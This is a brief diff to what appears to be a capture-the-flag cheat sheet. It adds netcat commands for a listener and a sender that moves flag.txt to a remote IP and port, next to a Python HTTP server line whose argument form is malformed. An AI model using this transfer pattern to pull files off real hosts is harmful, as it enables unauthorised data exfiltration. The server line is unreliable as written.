@@ -1,3 +1,11 @@
+__send file through netcat(listener)__
+
+nc -lvnp port > flag.txt
+
+__send file thru netcat (sender)__
+
+nc -w 3 listener ip port < flag.txt
+
 __python server__
 
 ( python3 -m http.server 192.168.0.104:8080 )
